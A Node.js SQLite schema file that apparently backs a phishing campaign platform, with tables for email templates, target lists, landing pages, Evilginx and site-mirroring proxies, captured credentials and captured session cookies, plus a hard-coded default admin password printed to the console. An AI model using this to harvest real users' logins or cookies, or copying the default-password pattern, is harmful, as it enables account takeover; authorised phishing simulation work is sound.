const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');

const db = new sqlite3.Database('./database.db', (err) => {
  if (err) {
    console.error('Error opening database:', err.message);
  } else {
    console.log('Connected to the SQLite database.');
  }
});

// Migration: Check and add proxy_port column to WebsiteMirroringSessions if it doesn't exist
db.get("PRAGMA table_info(WebsiteMirroringSessions)", (err, rows) => {
  if (!err) {
    // Check if the table exists first
    db.get("SELECT name FROM sqlite_master WHERE type='table' AND name='WebsiteMirroringSessions'", (err, tableExists) => {
      if (err) {
        console.error('Error checking if WebsiteMirroringSessions table exists:', err.message);
        return;
      }
      
      if (tableExists) {
        // Table exists, check if the column exists
        db.all("PRAGMA table_info(WebsiteMirroringSessions)", (err, columns) => {
          if (err) {
            console.error('Error checking WebsiteMirroringSessions columns:', err.message);
            return;
          }

          const hasProxyPort = columns.some(col => col.name === 'proxy_port');
          if (!hasProxyPort) {
            console.log('Adding proxy_port column to WebsiteMirroringSessions table...');
            db.run("ALTER TABLE WebsiteMirroringSessions ADD COLUMN proxy_port INTEGER", (err) => {
              if (err) {
                console.error('Error adding proxy_port column:', err.message);
              } else {
                console.log('proxy_port column added successfully.');
              }
            });
          }

          const hasSessionType = columns.some(col => col.name === 'session_type');
          if (!hasSessionType) {
            console.log('Adding session_type column to WebsiteMirroringSessions table...');
            db.run("ALTER TABLE WebsiteMirroringSessions ADD COLUMN session_type TEXT DEFAULT 'proxy'", (err) => {
              if (err) {
                console.error('Error adding session_type column:', err.message);
              } else {
                console.log('session_type column added successfully.');
              }
            });
          }
        });
      }
    });
  }
});

// Create tables if they do not exist
db.serialize(() => {
  // Users table (must be created first as other tables reference it)
  db.run(`
    CREATE TABLE IF NOT EXISTS Users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL UNIQUE,
      password_hash TEXT NOT NULL,
      email TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // After creating tables, check if we need to create a default admin user
  db.get("SELECT COUNT(*) as count FROM Users", [], (err, row) => {
    if (err) {
      console.error('Error checking Users table:', err.message);
      return;
    }
    
    // If no users exist, create a default admin user
    if (row.count === 0) {
      // Default credentials - username: admin, password: admin123
      const username = 'admin';
      const password = 'admin123';
      
      // Hash the password
      bcrypt.hash(password, 10, (err, hash) => {
        if (err) {
          console.error('Error hashing password:', err.message);
          return;
        }
        
        // Insert admin user
        db.run(
          "INSERT INTO Users (username, password_hash, email) VALUES (?, ?, ?)",
          [username, hash, 'admin@example.com'],
          function(err) {
            if (err) {
              console.error('Error creating admin user:', err.message);
            } else {
              console.log('Default admin user created successfully.');
              console.log('Username: admin');
              console.log('Password: admin123');
            }
          }
        );
      });
    }
  });

  // Existing tables
  db.run(`
    CREATE TABLE IF NOT EXISTS EmailTemplates (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      template_name TEXT NOT NULL,
      envelope_sender TEXT NOT NULL,
      subject TEXT NOT NULL,
      text TEXT NOT NULL,
      html TEXT NOT NULL,
      add_tracking_image INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES Users(id) ON DELETE CASCADE,
      UNIQUE(user_id, template_name)
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS TemplateAttachments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      template_id INTEGER NOT NULL,
      user_id INTEGER NOT NULL,
      file_path TEXT NOT NULL,
      original_name TEXT NOT NULL,
      FOREIGN KEY (template_id) REFERENCES EmailTemplates(id) ON DELETE CASCADE
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS UserGroups (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      group_name TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS GroupUsers (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      group_id INTEGER NOT NULL,
      first_name TEXT NOT NULL,
      last_name TEXT NOT NULL,
      email TEXT NOT NULL,
      position TEXT NOT NULL,
      FOREIGN KEY (group_id) REFERENCES UserGroups(id) ON DELETE CASCADE,
      UNIQUE(group_id, email)
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS LandingPages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      page_name TEXT NOT NULL,
      html_content TEXT,
      capture_submitted_data INTEGER DEFAULT 0,
      redirect_url TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);


  db.run(`
    CREATE TABLE IF NOT EXISTS SendingProfiles (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      from_address TEXT NOT NULL,
      host TEXT NOT NULL,
      username TEXT NOT NULL,
      password TEXT NOT NULL,
      ignore_cert_errors INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS ProfileHeaders (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      profile_id INTEGER NOT NULL,
      header_key TEXT NOT NULL,
      header_value TEXT NOT NULL,
      FOREIGN KEY (profile_id) REFERENCES SendingProfiles(id) ON DELETE CASCADE
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS Campaigns (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      template_id INTEGER NOT NULL,
      landing_page_id INTEGER,
      url TEXT NOT NULL,
      launch_date TEXT NOT NULL,
      send_by_date TEXT,
      profile_id INTEGER NOT NULL,
      group_id INTEGER NOT NULL,
      status TEXT DEFAULT 'Draft' CHECK (status IN ('Draft', 'In Progress', 'Sent', 'Partially Sent', 'Failed')),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      landing_page_url TEXT,
      use_evilginx INTEGER DEFAULT 0,
      evilginx_url TEXT,
      use_website_mirroring INTEGER DEFAULT 0,
      mirror_target_url TEXT,
      mirror_proxy_port INTEGER,
      FOREIGN KEY (template_id) REFERENCES EmailTemplates(id),
      FOREIGN KEY (landing_page_id) REFERENCES LandingPages(id),
      FOREIGN KEY (profile_id) REFERENCES SendingProfiles(id),
      FOREIGN KEY (group_id) REFERENCES UserGroups(id)
    )
  `);

  // Create tracking_pixels table if not exists
  db.run(`
    CREATE TABLE IF NOT EXISTS tracking_pixels (
      id TEXT PRIMARY KEY,
      campaign_id INTEGER NOT NULL,
      user_email TEXT NOT NULL,
      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id)
    )
  `);

  // Create open_logs table if not exists
  db.run(`
    CREATE TABLE IF NOT EXISTS open_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      pixel_id TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      ip TEXT,
      userAgent TEXT,
      FOREIGN KEY (pixel_id) REFERENCES tracking_pixels(id)
    )
  `);

  // Form submissions table
  db.run(`
    CREATE TABLE IF NOT EXISTS FormSubmissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER NOT NULL,
      landing_page_id INTEGER NOT NULL,
      form_data TEXT,
      ip_address TEXT,
      user_agent TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Form fields table for individual field storage
  db.run(`
    CREATE TABLE IF NOT EXISTS FormFields (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      submission_id INTEGER NOT NULL,
      field_name TEXT NOT NULL,
      field_value TEXT,
      field_type TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (submission_id) REFERENCES FormSubmissions(id) ON DELETE CASCADE
    )
  `);
  
  // Create website mirroring data table
  db.run(`
    CREATE TABLE IF NOT EXISTS WebsiteMirroringSessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER NOT NULL,
      session_token TEXT NOT NULL UNIQUE,
      target_url TEXT NOT NULL,
      proxy_port INTEGER NOT NULL,
      status TEXT DEFAULT 'active' CHECK (status IN ('active', 'inactive', 'error')),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_accessed DATETIME,
      access_count INTEGER DEFAULT 0,
      captured_data TEXT,
      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
    )
  `);

  // Create captured credentials table if not exists
  db.run(`
    CREATE TABLE IF NOT EXISTS captured_credentials (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER NOT NULL,
      url TEXT,
      username TEXT,
      password TEXT,
      other_fields TEXT,
      ip_address TEXT,
      user_agent TEXT,
      capture_method TEXT DEFAULT 'form_submission',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
    )
  `);

  // Create login attempts table if not exists
  db.run(`
    CREATE TABLE IF NOT EXISTS login_attempts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER NOT NULL,
      session_id TEXT NOT NULL,
      target_email TEXT NOT NULL,
      username TEXT,
      password TEXT,
      input_email TEXT,
      form_data TEXT,
      url TEXT,
      ip_address TEXT,
      user_agent TEXT,
      cookies TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      has_cookies INTEGER DEFAULT 0,
      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS link_clicks (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER,
      landing_page_id INTEGER,
      ip_address TEXT,
      user_agent TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Create captured cookies table for real-time cookie storage
  db.run(`
    CREATE TABLE IF NOT EXISTS captured_cookies (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      campaign_id INTEGER NOT NULL,
      session_token TEXT NOT NULL,
      cookie_name TEXT NOT NULL,
      cookie_value TEXT,
      domain TEXT,
      path TEXT DEFAULT '/',
      expiration_date INTEGER,
      secure INTEGER DEFAULT 0,
      http_only INTEGER DEFAULT 0,
      same_site TEXT,
      host_only INTEGER DEFAULT 1,
      session INTEGER DEFAULT 1,
      original_cookie TEXT,
      first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
      is_active INTEGER DEFAULT 1,
      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE,
      UNIQUE(session_token, cookie_name, domain, path)
    )
  `);

  // Create index for faster cookie lookups
  db.run(`
    CREATE INDEX IF NOT EXISTS idx_cookies_session 
    ON captured_cookies(session_token, is_active)
  `);

  db.run(`
    CREATE INDEX IF NOT EXISTS idx_cookies_campaign 
    ON captured_cookies(campaign_id, is_active)
  `);

  // Log table creation success
  console.log('Tracking tables initialized');
});

module.exports = db;
